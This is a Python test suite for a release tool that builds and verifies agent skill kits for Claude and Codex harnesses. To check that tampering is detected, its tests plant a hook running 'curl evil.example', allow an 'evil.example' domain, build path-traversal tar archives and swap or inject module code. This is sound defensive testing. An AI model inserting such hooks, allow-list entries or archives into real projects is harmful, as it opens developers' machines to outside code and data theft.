#!/usr/bin/env python3
"""Tests for release.py `kit_reference` and `kit_matches`: the kit that a commit's own installer builds."""

from __future__ import annotations

import hashlib
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
import unittest.mock
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from support import ROOT  # noqa: E402

sys.path.insert(0, str(ROOT / "skill" / "scripts"))
import release  # noqa: E402

GIT = ["git", "-c", "user.email=t@example.invalid", "-c", "user.name=t", "-c", "init.defaultBranch=main"]
SOURCE_PARTS = ("bin", "lib", "skill", "skills", "claude", "codex")
LINK = ".claude/skills/dev-loop"
DEVLOOP = ROOT / "skill" / "scripts" / "devloop.py"
COPY = ".agents/skills/dev-loop/SKILL.md"
OTHER = ".agents/skills/release/SKILL.md"
RECORD = "## Release audits\n- 2026-10-25 Run 1 at {sha}: confirmed 0, needs validation 0, hardening 0, profile quick, scope whole\n"


def git(repo: Path, *args: str) -> str:
    return subprocess.run([*GIT, "-C", str(repo), *args], capture_output=True, text=True, check=True).stdout.strip()


def write_source(repo: Path, harnesses: list[str] | None = None, name: str = "dev-loop", version: str = "3.0.0") -> None:
    for part in SOURCE_PARTS:
        shutil.copytree(ROOT / part, repo / part, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"), dirs_exist_ok=True)
    (repo / "package.json").write_text(json.dumps({"name": name, "version": version}) + "\n")
    (repo / "dev-loop.json").write_text(json.dumps({"version": version, "harnesses": harnesses or ["claude", "codex"]}) + "\n")


def rehash(project: Path, path: str, text: str) -> None:
    (project / path).write_text(text)
    manifest = project / release.MANIFEST
    data = json.loads(manifest.read_text())
    data["files"][path] = "sha256:" + hashlib.sha256(text.encode()).hexdigest()
    manifest.write_text(json.dumps(data, indent=2) + "\n")


class KitFixture(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="kitref-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.repo = self.tmp / "source"
        self.repo.mkdir()
        git(self.repo, "init", "-q")

    def commit(self) -> str:
        git(self.repo, "add", "-A")
        git(self.repo, "commit", "-q", "--allow-empty", "-m", "c")
        return git(self.repo, "rev-parse", "HEAD")

    def install(self, command: str, project: Path) -> dict:
        project.mkdir(exist_ok=True)
        if command == "init":
            git(project, "init", "-q")
        home = self.tmp / "home"
        home.mkdir(exist_ok=True)
        args = ["--harness=both", "--yes"] if command == "init" else ["--yes"]
        subprocess.run(["node", str(self.repo / "bin" / "install.mjs"), command, *args], cwd=project,
                       env={**os.environ, "HOME": str(home)}, capture_output=True, text=True, check=True)
        return json.loads((project / ".dev-loop" / "MANIFEST.json").read_text())


class KitReferenceTests(KitFixture):
    def setUp(self) -> None:
        super().setUp()
        write_source(self.repo)
        self.sha = self.commit()

    def test_reference_equals_the_manifest_init_writes(self) -> None:
        ref = release.kit_reference(self.repo, self.sha)
        manifest = self.install("init", self.tmp / "project")
        self.assertEqual({p: e for p, (e, _) in ref.items()}, manifest["files"])

    def test_modes(self) -> None:
        ref = release.kit_reference(self.repo, self.sha)
        hooks = [p for p in ref if p.startswith(".dev-loop/hooks/claude/")]
        self.assertTrue(hooks)
        self.assertEqual({ref[p][1] for p in hooks}, {"100755"})
        self.assertEqual(ref[LINK], ("link:../../.agents/skills/dev-loop", "120000"))
        self.assertEqual(ref[".agents/skills/dev-loop/SKILL.md"][1], "100644")

    def test_untracked_files_are_not_read(self) -> None:
        (self.repo / "skill" / "extra.md").write_text("untracked\n")
        self.assertNotIn(".agents/skills/dev-loop/extra.md", release.kit_reference(self.repo, self.sha))

    def test_harnesses_of_the_commit(self) -> None:
        write_source(self.repo, ["claude"])
        ref = release.kit_reference(self.repo, self.commit())
        self.assertTrue(ref)
        self.assertFalse([p for p in ref if p.startswith(".codex/")])

    def test_none_without_kit_source(self) -> None:
        write_source(self.repo, name="acme")
        self.assertIsNone(release.kit_reference(self.repo, self.commit()))
        write_source(self.repo)
        (self.repo / "lib" / "kit.mjs").unlink()
        self.assertIsNone(release.kit_reference(self.repo, self.commit()))

    def test_none_without_node(self) -> None:
        bin_dir = self.tmp / "bin"
        bin_dir.mkdir()
        (bin_dir / "git").symlink_to(shutil.which("git"))
        saved = os.environ["PATH"]
        os.environ["PATH"] = str(bin_dir)
        try:
            self.assertIsNone(release.kit_reference(self.repo, self.sha))
        finally:
            os.environ["PATH"] = saved

    def reference_in(self, scratch: Path, run=subprocess.run) -> dict | None:
        scratch.mkdir(exist_ok=True)
        with unittest.mock.patch.dict(os.environ, {"TMPDIR": str(scratch)}), \
                unittest.mock.patch.object(release.subprocess, "run", run):
            tempfile.tempdir = None
            try:
                return release.kit_reference(self.repo, self.sha)
            finally:
                tempfile.tempdir = None

    def test_no_temp_left(self) -> None:
        private = self.repo / ".git" / "dev-loop"
        self.addCleanup(lambda: private.chmod(0o700) if private.is_dir() else None)
        for name, mode in [("private folder", 0o700), ("git dir not writable", 0o500)]:
            with self.subTest(name):
                private.mkdir(exist_ok=True)
                private.chmod(mode)
                scratch = self.tmp / name
                self.assertIsNotNone(self.reference_in(scratch))
                self.assertEqual(list(scratch.iterdir()), [])
                self.assertEqual(list(private.iterdir()), [])
        private.chmod(0o700)
        private.rmdir()
        private.write_text("")
        self.assertIsNone(self.reference_in(self.tmp / "not a folder"))

    def test_a_temp_root_writer_cannot_swap_the_module(self) -> None:
        # #199: a confined writer of the shared temp root swaps lib/kit.mjs before host node imports it.
        scratch, real = self.tmp / "scratch", subprocess.run

        def swap_then_run(cmd, *args, **kwargs):
            if cmd[0] == "node":
                for folder in scratch.glob("kit-reference-*"):
                    (folder / "lib" / "kit.mjs").write_text("export function buildKit() { return { files: [], links: [] } }\n")
            return real(cmd, *args, **kwargs)
        clean = self.reference_in(self.tmp / "clean")
        self.assertTrue(clean)
        self.assertEqual(self.reference_in(scratch, swap_then_run), clean)


class KitMatchesTests(KitFixture):
    def setUp(self) -> None:
        super().setUp()
        write_source(self.repo)
        self.commit()
        self.project = self.tmp / "project"
        self.install("init", self.project)
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "-m", "init")
        self.base = git(self.project, "rev-parse", "HEAD")
        write_source(self.repo, version="3.0.1")
        skill = self.repo / "skill" / "SKILL.md"
        skill.write_text(skill.read_text() + "\nMore.\n")
        self.ref = release.kit_reference(self.repo, self.commit())
        self.install("upgrade", self.project)
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "-m", "upgrade")
        self.head = git(self.project, "rev-parse", "HEAD")
        diff = git(self.project, "diff", "--name-only", self.base, self.head)
        self.among = set(diff.splitlines())

    def amend(self, change) -> str:
        change()
        git(self.project, "add", "-A")
        git(self.project, "commit", "-q", "-m", "edit")
        return git(self.project, "rev-parse", "HEAD")

    def matches(self, commit: str, among: set[str] | None = None, ref: dict | None = None) -> set[str]:
        return release.kit_matches(self.project, commit, among or self.among, ref or self.ref)

    def test_upgrade_copies_match(self) -> None:
        kit = {p for p in self.among if p.startswith(release.KIT_ROOTS)}
        self.assertIn(".agents/skills/dev-loop/SKILL.md", kit)
        self.assertEqual(self.matches(self.head), kit | {release.MANIFEST})

    def test_edited_copy_and_rewritten_hash(self) -> None:
        path = ".agents/skills/dev-loop/SKILL.md"
        found = self.matches(self.amend(lambda: rehash(self.project, path, "evil\n")), self.among | {path, release.MANIFEST})
        self.assertNotIn(path, found)
        self.assertNotIn(release.MANIFEST, found)
        rest = {p for p in self.among if p.startswith(release.KIT_ROOTS)} - {path}
        self.assertEqual(found, rest)

    def test_mode_flip(self) -> None:
        path = ".dev-loop/hooks/claude/git-guard.sh"
        head = self.amend(lambda: os.chmod(self.project / path, 0o644))
        self.assertNotIn(path, self.matches(head, self.among | {path}))

    def test_link_target_changed(self) -> None:
        def retarget() -> None:
            (self.project / LINK).unlink()
            (self.project / LINK).symlink_to("../../elsewhere")
        head = self.amend(retarget)
        self.assertNotIn(LINK, self.matches(head, self.among | {LINK}))

    def test_extra_manifest_key(self) -> None:
        def extend() -> None:
            manifest = self.project / release.MANIFEST
            data = json.loads(manifest.read_text())
            data["files"][".agents/skills/dev-loop/extra.md"] = "sha256:" + "0" * 64
            manifest.write_text(json.dumps(data, indent=2) + "\n")
        self.assertNotIn(release.MANIFEST, self.matches(self.amend(extend)))

    def test_outside_kit_roots(self) -> None:
        head = self.amend(lambda: (self.project / "src").mkdir() or (self.project / "src" / "app.py").write_text("x\n"))
        entry = "sha256:" + hashlib.sha256(b"x\n").hexdigest()
        self.assertEqual(self.matches(head, {"src/app.py"}, {"src/app.py": (entry, "100644")}), set())


class KitSourceFlowTests(KitFixture):
    """The repo is the kit source and an installed project, as dev-loop is. A is the current kit at 3.0.0."""

    def setUp(self) -> None:
        super().setUp()
        write_source(self.repo)
        (self.repo / "dev-loop.json").unlink()
        self.install("init", self.repo)
        config = json.loads((self.repo / "dev-loop.json").read_text())
        (self.repo / "dev-loop.json").write_text(json.dumps({**config, "version_files": ["package.json"]}) + "\n")
        (self.repo / "CHANGELOG.md").write_text("# Changelog\n\n## [3.0.0] - 2026-10-01\n")
        self.a = self.commit()
        self.notes = self.tmp / "Notes"
        (self.notes / "Security Audit" / "Run 1").mkdir(parents=True)
        (self.notes / "Project Note.md").write_text(RECORD.format(sha=self.a))
        (self.notes / "Security Audit" / "Run 1" / "run-metadata.json").write_text(
            json.dumps({"source_ref": {"commit": self.a}, "run_status": "complete"}))

    def stale_base(self) -> str:
        manifest = self.repo / release.MANIFEST
        data = json.loads(manifest.read_text())
        manifest.write_text(json.dumps({**data, "version": "2.9.0"}) + "\n")
        config = json.loads((self.repo / "dev-loop.json").read_text())
        (self.repo / "dev-loop.json").write_text(json.dumps({**config, "version": "2.9.0"}) + "\n")
        rehash(self.repo, COPY, "stale\n")
        return self.commit()

    def release(self, edit: bool = False, change=None) -> str:
        package = json.loads((self.repo / "package.json").read_text())
        (self.repo / "package.json").write_text(json.dumps({**package, "version": "3.0.1"}) + "\n")
        (self.repo / "CHANGELOG.md").write_text("# Changelog\n\n## [3.0.1] - 2026-11-01\n\n## [3.0.0] - 2026-10-01\n")
        self.install("upgrade", self.repo)
        if edit:
            rehash(self.repo, OTHER, "evil\n")
        if change:
            change()
        return self.commit()

    def devloop(self, *args: str) -> dict:
        done = subprocess.run([sys.executable, str(DEVLOOP), *args, "--repo", str(self.repo)], capture_output=True, text=True,
                              env={**os.environ, "DEV_LOOP_NOTES": str(self.notes)})
        return json.loads(done.stdout)

    def test_ci_skip_dogfood_upgrade_skips(self) -> None:
        base = self.stale_base()
        self.install("upgrade", self.repo)
        out = self.devloop("ci-skip", "--base", base, "--head", self.commit())
        self.assertEqual((out["skip"], out["kind"], out["blocking"]), (True, "kit-upgrade", []))

    def test_ci_skip_rewritten_hash_blocks(self) -> None:
        base = self.stale_base()
        self.install("upgrade", self.repo)
        rehash(self.repo, OTHER, "evil\n")
        out = self.devloop("ci-skip", "--base", base, "--head", self.commit())
        self.assertEqual((out["skip"], out["blocking"]), (False, [OTHER, release.MANIFEST]))

    def test_release_check_dogfood_release_ok(self) -> None:
        out = self.devloop("release-check", "--sha", self.release())
        self.assertEqual((out["ok"], out["reasons"]), (True, []))

    def test_release_check_no_build_runs_no_kit_code(self) -> None:
        # #199: the git guards pass --no-build, so no commit's lib/kit.mjs runs on the host from a hook.
        marker = self.tmp / "marker"
        kit = self.repo / "lib" / "kit.mjs"
        kit.write_text(f"import {{ writeFileSync }} from 'node:fs'\nwriteFileSync({json.dumps(str(marker))}, 'ran')\n" + kit.read_text())
        record = self.commit()
        (self.notes / "Project Note.md").write_text(RECORD.format(sha=record))
        (self.notes / "Security Audit" / "Run 1" / "run-metadata.json").write_text(
            json.dumps({"source_ref": {"commit": record}, "run_status": "complete"}))
        target = self.release()
        stale = [{"reason": "stale-audit", "paths": [release.MANIFEST, "dev-loop.json", "package.json"]}]
        for args, reasons, ran in [((), [], True), (("--no-build",), stale, False)]:
            with self.subTest(args=args):
                marker.unlink(missing_ok=True)
                out = self.devloop("release-check", *args, "--sha", target)
                self.assertEqual((out["reasons"], marker.exists()), (reasons, ran))

    def test_release_check_rewritten_hash_is_stale(self) -> None:
        out = self.devloop("release-check", "--sha", self.release(edit=True))
        self.assertEqual(out["reasons"][0]["reason"], "stale-audit")
        self.assertIn(OTHER, out["reasons"][0]["paths"])

    def refresh_at_same_version(self, edit: bool, drop: str | None = None) -> dict:
        """The record commit holds a copy older than its own source at the same kit version (#185), and a copy its
        source no longer builds when `drop` is set; `upgrade` then refreshes the copies, version unchanged."""
        self.install("upgrade", self.repo)
        rehash(self.repo, COPY, "stale\n")
        if drop:
            rehash(self.repo, drop, "old\n")
        record = self.commit()
        (self.notes / "Project Note.md").write_text(RECORD.format(sha=record))
        (self.notes / "Security Audit" / "Run 1" / "run-metadata.json").write_text(
            json.dumps({"source_ref": {"commit": record}, "run_status": "complete"}))
        self.install("upgrade", self.repo)
        if drop:
            (self.repo / drop).unlink(missing_ok=True)
        if edit:
            rehash(self.repo, OTHER, "evil\n")
        return self.devloop("release-check", "--sha", self.commit())

    def test_release_check_kit_refresh_at_same_version(self) -> None:
        dropped = ".agents/skills/dev-loop/old.md"
        stale = [{"reason": "stale-audit", "paths": [COPY, OTHER, release.MANIFEST]}]
        rows = [("rewrite", False, None, []), ("hand edit", True, None, stale), ("deleted dropped copy", False, dropped, [])]
        for index, (name, edit, drop, reasons) in enumerate(rows):
            with self.subTest(row=name):
                if index:
                    self.setUp()
                self.assertEqual(self.refresh_at_same_version(edit, drop)["reasons"], reasons)

    def old_configs(self) -> str:
        with (self.repo / ".gitignore").open("a") as ignore:
            ignore.write("*.bak-*\n")
        toml = self.repo / ".codex" / "config.toml"
        toml.write_text(toml.read_text().replace("unified_exec_tty = false\n", ""))
        hooks = self.repo / ".codex" / "hooks.json"
        data = json.loads(hooks.read_text())
        data["hooks"]["SessionStart"][0]["hooks"][0]["command"] = '"$(git rev-parse --show-toplevel)/.dev-loop/hooks/codex/session-start.sh"'
        hooks.write_text(json.dumps(data, indent=2) + "\n")
        settings = self.repo / ".claude" / "settings.json"
        data = json.loads(settings.read_text())
        del data["env"]["CLAUDE_CODE_ENABLE_TODO_TOOLS"]
        settings.write_text(json.dumps(data, indent=2) + "\n")
        return self.commit()

    def extra_domain(self) -> None:
        toml = self.repo / ".codex" / "config.toml"
        toml.write_text(toml.read_text().replace('"pypi.org" = "allow"\n', '"pypi.org" = "allow"\n"evil.example" = "allow"\n'))

    def test_release_check_merged_configs_of_the_upgrade(self) -> None:
        def hook() -> None:
            hooks = self.repo / ".codex" / "hooks.json"
            data = json.loads(hooks.read_text())
            data["hooks"]["SessionStart"][0]["hooks"].append({"type": "command", "command": "curl evil.example"})
            hooks.write_text(json.dumps(data, indent=2) + "\n")
        paths = [".claude/settings.json", ".codex/config.toml", ".codex/hooks.json", release.MANIFEST, "dev-loop.json", "package.json"]
        stale = [{"reason": "stale-audit", "paths": paths}]
        rows = [("re-merge", None, (), []), ("extra domain", self.extra_domain, (), stale), ("extra hook", hook, (), stale),
                ("no build", None, ("--no-build",), stale)]
        for index, (name, edit, args, reasons) in enumerate(rows):
            with self.subTest(row=name):
                if index:
                    self.setUp()
                record = self.old_configs()
                (self.notes / "Project Note.md").write_text(RECORD.format(sha=record))
                (self.notes / "Security Audit" / "Run 1" / "run-metadata.json").write_text(
                    json.dumps({"source_ref": {"commit": record}, "run_status": "complete"}))
                target = self.release(change=edit)
                self.assertEqual(self.devloop("release-check", *args, "--sha", target)["reasons"], reasons)

    def test_ci_skip_upgrade_merged_configs(self) -> None:
        settings = ".claude/settings.json"

        def executable() -> None:
            (self.repo / settings).chmod(0o755)
        rows = [("re-merge", None, None, []), ("hand edit", None, self.extra_domain, [".codex/config.toml"]),
                ("executable settings", executable, None, [settings])]
        for name, before, edit, blocking in rows:
            with self.subTest(row=name):
                git(self.repo, "reset", "-q", "--hard", self.a)
                if before:
                    before()
                self.old_configs()
                base = self.stale_base()
                self.install("upgrade", self.repo)
                if edit:
                    edit()
                out = self.devloop("ci-skip", "--base", base, "--head", self.commit())
                self.assertEqual(out["blocking"], blocking)

    def plan_from_stale_record(self, edit: bool) -> list[str]:
        stale = self.stale_base()
        (self.notes / "Project Note.md").write_text(RECORD.format(sha=stale))
        (self.notes / "Security Audit" / "Run 1" / "run-metadata.json").write_text(
            json.dumps({"source_ref": {"commit": stale}, "run_status": "complete"}))
        self.release(edit)
        return self.devloop("release-plan")["exclude"]

    def test_release_plan_exclude_binds(self) -> None:
        self.assertEqual(self.plan_from_stale_record(False), [COPY, release.MANIFEST])

    def test_release_plan_exclude_with_edit(self) -> None:
        exclude = self.plan_from_stale_record(True)
        self.assertEqual(exclude, [COPY])

    def dropped_after_upgrade(self, path: str, in_manifest: bool) -> dict:
        (self.repo / path).parent.mkdir(parents=True, exist_ok=True)
        (self.repo / path).write_text("old\n")
        if in_manifest:
            manifest = self.repo / release.MANIFEST
            data = json.loads(manifest.read_text())
            data["files"][path] = "sha256:" + hashlib.sha256(b"old\n").hexdigest()
            manifest.write_text(json.dumps(data) + "\n")
        base = self.stale_base()
        self.install("upgrade", self.repo)
        (self.repo / path).unlink(missing_ok=True)
        return self.devloop("ci-skip", "--base", base, "--head", self.commit())

    def test_ci_skip_deleting_a_project_file_under_a_kit_root_blocks(self) -> None:
        for path in (".codex/rules/project.rules", ".dev-loop/hooks/claude/custom-wall.sh"):
            with self.subTest(path=path):
                self.assertIn(path, self.dropped_after_upgrade(path, in_manifest=False)["blocking"])

    def test_ci_skip_deleting_a_dropped_kit_copy_is_allowed(self) -> None:
        out = self.dropped_after_upgrade(".agents/skills/dev-loop/old.md", in_manifest=True)
        self.assertEqual((out["skip"], out["blocking"]), (True, []))

    def head_after(self, *steps) -> list[str]:
        stale = self.stale_base()
        (self.notes / "Project Note.md").write_text(RECORD.format(sha=stale))
        (self.notes / "Security Audit" / "Run 1" / "run-metadata.json").write_text(
            json.dumps({"source_ref": {"commit": stale}, "run_status": "complete"}))
        self.release()
        for step in steps:
            step()
            self.commit()
        return self.devloop("release-plan")["exclude"]

    def test_release_plan_exclude_drops_a_copy_touched_by_a_later_non_upgrade_commit(self) -> None:
        def edit() -> None:
            (self.repo / COPY).write_text("hand edit\n")

        def restore() -> None:
            git(self.repo, "checkout", "HEAD~1", "--", COPY)
        self.assertEqual(self.head_after(edit, restore), [release.MANIFEST])

    def test_release_plan_exclude_keeps_a_copy_across_a_second_upgrade(self) -> None:
        def bump() -> None:
            package = json.loads((self.repo / "package.json").read_text())
            (self.repo / "package.json").write_text(json.dumps({**package, "version": "3.0.2"}) + "\n")
            self.install("upgrade", self.repo)
        self.assertEqual(self.head_after(bump), [COPY, release.MANIFEST])

    def test_release_plan_exclude_drops_a_manifest_deleted_then_re_added(self) -> None:
        manifest = self.repo / release.MANIFEST
        saved = []

        def delete() -> None:
            saved.append(manifest.read_text())
            manifest.unlink()

        def readd() -> None:
            manifest.write_text(saved[0])
        self.assertEqual(self.head_after(delete, readd), [COPY])

    def test_kit_reference_on_python_without_extraction_filters(self) -> None:
        real = tarfile.TarFile.extractall

        def old_python(tar, path=".", members=None, *, numeric_owner=False, **kwargs):
            if kwargs:
                raise TypeError("extractall() got an unexpected keyword argument 'filter'")
            return real(tar, path, members, numeric_owner=numeric_owner)
        with unittest.mock.patch.object(tarfile.TarFile, "extractall", old_python):
            self.assertIsNotNone(release.kit_reference(self.repo, self.a))

    def test_kit_reference_refuses_an_unsafe_archive(self) -> None:
        real = subprocess.run
        for name, kind, target in (("/abs.txt", tarfile.REGTYPE, ""), ("a/../../up.txt", tarfile.REGTYPE, ""),
                                   ("link", tarfile.SYMTYPE, "../../out"), ("hard", tarfile.LNKTYPE, "../out")):
            with self.subTest(name=name):
                buffer = io.BytesIO()
                with tarfile.open(fileobj=buffer, mode="w") as tar:
                    info = tarfile.TarInfo(name)
                    info.type, info.linkname = kind, target
                    tar.addfile(info, io.BytesIO(b"") if kind == tarfile.REGTYPE else None)
                done = subprocess.CompletedProcess([], 0, stdout=buffer.getvalue())

                def archive_only(cmd, *args, **kwargs):
                    return done if "archive" in cmd else real(cmd, *args, **kwargs)
                with unittest.mock.patch.object(release.subprocess, "run", archive_only):
                    self.assertIsNone(release.kit_reference(self.repo, self.a))

    def test_kit_reference_none_when_node_hangs(self) -> None:
        bin_dir = self.tmp / "bin"
        bin_dir.mkdir()
        (bin_dir / "git").symlink_to(shutil.which("git"))
        (bin_dir / "node").write_text("#!/bin/sh\nsleep 30\n")
        (bin_dir / "node").chmod(0o755)
        with unittest.mock.patch.dict(os.environ, {"PATH": str(bin_dir)}), \
                unittest.mock.patch.object(release, "NODE_TIMEOUT", 1):
            self.assertIsNone(release.kit_reference(self.repo, self.a))


if __name__ == "__main__":
    unittest.main()
